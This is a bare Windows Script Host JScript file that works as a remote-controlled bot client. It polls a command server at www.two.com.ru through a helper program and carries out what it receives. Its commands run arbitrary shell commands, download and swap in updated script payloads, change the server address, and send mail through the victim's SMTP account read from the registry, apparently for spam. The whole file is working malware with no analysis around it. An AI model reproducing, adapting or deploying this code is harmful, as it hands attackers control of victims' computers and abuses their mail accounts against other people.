var verTimeStamp = 2068998397;
var defaultCmdURL = "www.two.com.ru";
var uniqueId = "1034707986_40";

var cmdURL = "";

var shell = WScript.CreateObject("WSCript.shell");
var fs = WScript.CreateObject("Scripting.FileSystemObject");
var p = WScript.ScriptFullName;
p = p.substr(0, p.lastIndexOf('\\')+1);

var locked = false;
try{
	var lock = fs.CreateTextFile(p+'lock', 2);
}catch(e){locked=true;}

if(!locked) main();


function main()
{
	var exit;

	do{
		exit = false;
		if(cmdURL=="") cmdURL = defaultCmdURL;

		var f = fs.CreateTextFile(p+'i.js', 2);
		f.Write('GET /cmds/?ip='+uniqueId+'&ver='+verTimeStamp+
				' HTTP/1.0\nHost: '+cmdURL+'\n\n');
		f.Close();
		shell.Run('\"'+p+'netd.exe\" h'+cmdURL, 0, true);

		f = fs.OpenTextFile(p+'o.js', 1);
		try{
		s = f.Read(1000000);
		}catch(e){s="SLEEP\x01\x0A10"};
		f.Close();

		var cmds;

		cmds = s.split("\x01\x0A");

		var i;
		for(i=0; i<cmds.length; i+=2)
			{
				if(cmds[i] == "EXIT") {exit = true;break;}
				else
				if(cmds[i] == "NOBREAK") exit = false;
				else
				if(cmds[i] == "SETCMDURL") cmdURL = cmds[i+1];
				else
				if(cmds[i] == "RUN") cmdRun(cmds[i+1]);
				else
				if(cmds[i] == "SENDMAIL") cmdSendMail(cmds[i+1]);
				else
				if(cmds[i] == "UPDATE") cmdUpDate(cmds[i+1]);
				else
				if(cmds[i] == "ALERT") cmdAlert(cmds[i+1]);
				else
				if(cmds[i] == "SLEEP") cmdSleep(cmds[i+1]);
				else
				if(cmds[i] == "SENDCONFIRM") cmdConfirm(cmds[i+1]);
				else
				if(cmds[i] == "RUNTHESELF")
				{
					lock.Close();
					shell.Run('wscript \"'+p+'zshell.js'+'\"');;
					exit = true;
					break;
				}
			}
		if(cmds.length<2) cmdSleep(1);
	}while(!exit);
} // main

function cmdRun(s)
{
	shell.Run(s, 7);
}

function cmdAlert(s)
{
	WScript.Echo(s);
}

function cmdSleep(s)
{
	for(i=0; i<s; i++)
		shell.Run('\"'+p+'netd.exe\" w', 0, true);
}

function cmdUpDate(s)
{
	var f = fs.CreateTextFile(p+'i.js', 2);
	f.Write('GET '+s+' HTTP/1.0\nHost: '+cmdURL+'\n\n');
	f.Close();
	shell.Run('\"'+p+'netd.exe\" h'+cmdURL, 0, true);
	fs.CopyFile(p+'o.js', p+'zshell.js');
}

var mailSent;

function sendMail(smtp)
{
	shell.Run('\"'+p+'netd.exe\" x'+smtp, 0, true);

	var s;
	f = fs.OpenTextFile(p+'o.js', 1);
	try{
	s = f.Read(1000000);
	}catch(e){s=""};
	f.Close();
	return s;
}

function cmdSendMail(s)
{

	var f = fs.CreateTextFile(p+'i.js', 2);
	f.Write(s);
	f.Close();

	var smtp;
	try{
		smtp = shell.RegRead("HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Account Manager\\Accounts\\00000001\\SMTP Server");
	}catch(e) {smtp = 'mail.ru';}

	mailSent = false;
	s = sendMail(smtp);

	if(s.indexOf("250")==-1)
	{
		s = sendMail('mail.ru');
		smtp = 'mail.ru';
		if(s.indexOf("250")!=-1)
			mailSent = true;
	}else mailSent = true;

}

function cmdConfirm(s)
{
	if(mailSent)
	{
		var f = fs.CreateTextFile(p+'i.js', 2);
		f.Write('GET /cmds/?confirm='+s+' HTTP/1.0\nHost: '+cmdURL+'\n\n');
		f.Close();
		shell.Run('\"'+p+'netd.exe\" h'+cmdURL, 0, true);
	}
}
